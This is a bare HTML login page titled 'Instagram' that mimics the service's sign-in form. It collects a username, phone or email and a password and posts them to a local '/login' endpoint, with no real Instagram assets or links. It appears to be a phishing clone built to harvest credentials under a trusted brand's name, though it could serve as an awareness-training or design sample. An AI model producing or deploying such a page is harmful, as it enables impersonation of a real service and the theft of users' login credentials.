<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial, sans-serif; background: #fafafa; }
form { background: white; padding: 20px; margin: 50px auto; width: 90%; max-width: 350px; border: 1px solid #dbdbdb; }
input { width: 100%; padding: 12px; margin: 8px 0; }
button { width: 100%; padding: 12px; background: #3897f0; color: white; border: none; font-size: 16px; }
</style>
</head>
<body>
<form action="/login" method="POST">
<h2>Instagram</h2>
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</body>
</html>
